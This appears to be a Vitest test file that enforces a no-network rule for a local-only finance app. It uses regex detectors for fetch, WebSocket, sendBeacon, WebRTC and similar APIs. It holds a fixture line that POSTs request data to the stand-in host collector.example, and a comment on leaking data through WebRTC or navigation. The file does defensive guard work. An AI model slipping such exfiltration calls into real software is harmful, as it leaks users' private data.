import { readFileSync, readdirSync } from 'node:fs'
import { dirname, join, relative, sep } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { blankComments, sourceFiles } from './buildGuardScan'

// LOCAL FOREVER, as a build gate.
//
// Horizon's promise is that a household's financial profile — income history, balances,
// pension values — never leaves the device. That promise is only worth something if it cannot
// be broken by accident, so the code that could break it is forbidden outright: there is no
// `fetch`, no XMLHttpRequest, no WebSocket, no EventSource, no `sendBeacon` anywhere in the
// app's own source, and the Worker has no /api (worker/index.ts only serves static assets).
// The CSP (`connect-src 'self'`, worker/securityHeaders.ts) is the second lock on the same
// door; this test is the first.
//
// What is NOT matched, on purpose: the service worker REGISTRATION (`navigator.serviceWorker`
// .register) and `reg.update()` — they talk to our own origin's /sw.js, and offline-first is
// the product. The generated sw.js itself uses `fetch` to fill its own cache; it is a build
// output (vite.config.ts), not source, and it fetches same-origin URLs only.
//
// ALLOWED is empty and should stay empty: a legitimate network need is a product decision, so
// it belongs in a conversation and in CLAUDE.md, not in a quiet entry here.
//
// WHAT THIS DOES NOT HOLD, said plainly so the promise is not stronger in the README than it is in the code:
//   · the guard reads OUR source. A compromised dependency in node_modules is held only by the CSP (`connect-src 'self'`
//     covers fetch, XHR, WebSocket, EventSource and sendBeacon).
//   · THE CSP DOES NOT COVER WebRTC, and top-level navigation (`location.assign('https://…?' + data)`) has no CSP
//     directive at all. A dependency that went hostile could still leak over those. The CSP `webrtc 'block'` directive
//     exists, but it is Chromium-only and an unrecognised directive is logged as a console error elsewhere (the
//     offline harness asserts a silent console), so it is NOT shipped on a guess — the grep below bans the RTC and
//     WebTransport APIs in our own code, and that is the whole of what is held there.

const srcDir = join(dirname(fileURLToPath(import.meta.url)), '..')
const rootDir = join(srcDir, '..')

const ALLOWED = new Map<string, string>([])

// The network surface of the browser, as code a person could write — every SPELLING of it. The first version banned
// `fetch(` and nothing else: `window.fetch(u)`, `globalThis.fetch(u)`, `fetch?.(u)`, `const f = fetch; f(u)` and
// `window['fetch'](u)` all walked past it, held only by the CSP behind.
const BANNED: ReadonlyArray<readonly [name: string, re: RegExp]> = [
  // The bare identifier: a call, an optional call, or an ALIAS (`const f = fetch`). Not `obj.fetch` (someone else's
  // method) and not `{ fetch: … }` (an object key).
  ['fetch', /(?<![.\w$])fetch\b(?!\s*:)/g],
  ['window.fetch / globalThis.fetch', /\b(?:window|globalThis|self|top|parent)\s*\.\s*fetch\b/g],
  ['a network API by computed name', /\[\s*['"`](?:fetch|sendBeacon|XMLHttpRequest|WebSocket|EventSource)['"`]\s*\]/g],
  ['XMLHttpRequest', /\bXMLHttpRequest\b/g],
  ['WebSocket', /\bWebSocket\b/g],
  ['EventSource', /\bEventSource\b/g],
  ['sendBeacon', /\bsendBeacon\b/g],
  ['WebRTC / WebTransport', /\b(?:RTCPeerConnection|webkitRTCPeerConnection|RTCDataChannel|WebTransport)\b/g],
  ['navigator.connection', /\bnavigator\.connection\b/g],
]

// THE WORKER is scanned too: the CSP governs the BROWSER, not the Worker, so an outbound call added to worker/ would
// pass both of the other locks. It has exactly two legitimate `fetch` tokens, allowed by their SHAPE (not by exempting
// the file): its own inbound handler, and the assets binding that serves the built app from the same deployment.
const WORKER_SHAPES: ReadonlyArray<readonly [what: string, re: RegExp]> = [
  ['the Worker\'s own inbound fetch handler', /\basync fetch\(request: Request, env: Env\)/g],
  ['the assets binding (same deployment)', /\benv\.ASSETS\.fetch\(/g],
]

/** index.html: what a CSP does not govern. A `preconnect` or `dns-prefetch` to a third party tells it the visitor came. */
const HTML_BANNED: ReadonlyArray<readonly [name: string, re: RegExp]> = [
  ['an absolute URL', /https?:\/\/[^\s"'<>]+/g],
  ['a resource hint (preconnect / dns-prefetch / prefetch / prerender)', /\brel\s*=\s*["']?(?:preconnect|dns-prefetch|prefetch|prerender)/gi],
]

interface Site {
  file: string
  line: number
  what: string
}

function scanText(file: string, text: string): Site[] {
  const out: Site[] = []
  for (const [what, re] of BANNED) {
    for (const m of text.matchAll(re)) out.push({ file, line: text.slice(0, m.index).split('\n').length, what })
  }
  return out
}

/** Worker source with its two legitimate `fetch` shapes removed, then scanned like everything else. */
function scanWorker(file: string, text: string): Site[] {
  let rest = blankComments(text)
  for (const [, re] of WORKER_SHAPES) rest = rest.replace(re, '')
  return scanText(file, rest)
}

function scanHtml(file: string, text: string): Site[] {
  const rest = text.replace(/<!--[\s\S]*?-->/g, (c) => c.replace(/[^\n]/g, ''))
  const out: Site[] = []
  for (const [what, re] of HTML_BANNED) for (const m of rest.matchAll(re)) out.push({ file, line: rest.slice(0, m.index).split('\n').length, what })
  return out
}

function networkSites(): Site[] {
  const out: Site[] = []
  for (const f of sourceFiles(srcDir)) {
    out.push(...scanText(relative(rootDir, f).split(sep).join('/'), blankComments(readFileSync(f, 'utf8'))))
  }
  // The one hand-written script that runs in the page outside the bundle.
  for (const name of readdirSync(join(rootDir, 'public')).filter((n) => n.endsWith('.js'))) {
    out.push(...scanText(`public/${name}`, blankComments(readFileSync(join(rootDir, 'public', name), 'utf8'))))
  }
  // The Worker and the page's own HTML: the two places a CSP does not reach (see above).
  for (const name of readdirSync(join(rootDir, 'worker')).filter((n) => n.endsWith('.ts'))) {
    out.push(...scanWorker(`worker/${name}`, readFileSync(join(rootDir, 'worker', name), 'utf8')))
  }
  out.push(...scanHtml('index.html', readFileSync(join(rootDir, 'index.html'), 'utf8')))
  return out
}

describe('local forever (no network code in the app)', () => {
  // The canary: the detector pinned against a fixture with every shape, and the look-alikes
  // it must leave alone.
  it('the detector sees every network shape and none of its look-alikes', () => {
    const fixture = [
      `await fetch('/api/x')`, // 1
      `new XMLHttpRequest()`, // 2
      `new WebSocket(u)`, // 3
      `new EventSource(u)`, // 4
      `navigator.sendBeacon(u, d)`, // 5
      `const refetch = 1`, // not fetch
      `obj.fetch(x)`, // a method named fetch is someone else's — and still caught by review
      `navigator.serviceWorker.register('/sw.js')`, // our own origin: allowed
      `reg.update()`,
      `await window.fetch(u)`, // 10 ← the spelling the first version walked past
      `await globalThis.fetch(u)`, // 11
      `await self.fetch(u)`, // 12
      `await fetch?.(u)`, // 13 ← an optional call
      `const f = fetch`, // 14 ← an alias: the call site never says fetch
      `window['fetch'](u)`, // 15 ← computed access
      `navigator['sendBeacon'](u, d)`, // 16
      `new RTCPeerConnection()`, // 17 ← not under connect-src
      `new WebTransport(u)`, // 18
      `const o = { fetch: 1 }`, // an object KEY, not a call
      `const prefetched = 1`, // contains « fetch », is not it
    ].join('\n')
    const hits = scanText('fixture', fixture)
    expect([...new Set(hits.map((h) => h.line))].sort((a, b) => a - b)).toEqual([1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18])
  })

  it('the Worker is scanned by SHAPE: its inbound handler and the assets binding pass, an outbound call does not', () => {
    const ok = [
      `export default {`,
      `  async fetch(request: Request, env: Env): Promise<Response> {`,
      `    const res = await env.ASSETS.fetch(request)`,
      `    return res`,
      `  },`,
      `}`,
    ].join('\n')
    expect(scanWorker('worker/index.ts', ok)).toEqual([])
    const leak = ok.replace('return res', `await fetch('https://collector.example/', { method: 'POST', body: JSON.stringify(request.url) })\n    return res`)
    expect(scanWorker('worker/index.ts', leak).map((s) => s.what)).toEqual(['fetch'])
    // …and a handler with a DIFFERENT signature is not the allowed one: it is not exempt by file.
    expect(scanWorker('worker/other.ts', `export default { async fetch(r: Request) { return fetch(r) } }`).length).toBeGreaterThan(0)
  })

  it('index.html is scanned for what a CSP does not govern: an absolute URL or a resource hint to a third party', () => {
    expect(scanHtml('index.html', `<link rel="manifest" href="/manifest.webmanifest" />\n<!-- see https://example.com -->`)).toEqual([])
    const hits = scanHtml('index.html', `<link rel="preconnect" href="https://fonts.gstatic.com" />\n<script src="https://cdn.example/x.js"></script>`)
    expect(hits.map((h) => h.what)).toEqual(['an absolute URL', 'an absolute URL', 'a resource hint (preconnect / dns-prefetch / prefetch / prerender)'])
  })

  it('the app imports nothing from scripts/ or e2e/: the one place that DOES fetch (scripts/check-sources) stays fenced off by more than a folder name', () => {
    const importsOutside = sourceFiles(srcDir)
      .filter((f) => /from\s+['"][^'"]*\/(?:scripts|e2e)\/[^'"]*['"]/.test(readFileSync(f, 'utf8')))
      .map((f) => relative(rootDir, f).split(sep).join('/'))
    expect(importsOutside).toEqual([])
  })

  it('scans the whole tree (a floor, so an empty walk cannot pass)', () => {
    expect(sourceFiles(srcDir).length).toBeGreaterThan(10)
  })

  it('no fetch / XHR / WebSocket / EventSource / sendBeacon / WebRTC anywhere in src/, public/, worker/ or index.html', () => {
    const offenders = networkSites()
      .filter((s) => !ALLOWED.has(s.file))
      .map((s) => `${s.file}:${s.line} ${s.what}`)
    expect(
      offenders,
      'Horizon keeps the profile on the device and sends nothing anywhere. A network need is a PRODUCT decision: raise it, change CLAUDE.md and the CSP together — do not add an ALLOWED entry.',
    ).toEqual([])
  })

  it('every ALLOWED file still has network code (a stale entry reads as permission)', () => {
    const live = new Set(networkSites().map((s) => s.file))
    expect([...ALLOWED.keys()].filter((f) => !live.has(f))).toEqual([])
  })

  it('the CSP keeps the second lock: connect-src stays \'self\'', () => {
    const csp = readFileSync(join(rootDir, 'worker', 'securityHeaders.ts'), 'utf8')
    expect(csp).toContain(`"connect-src 'self'"`)
  })
})
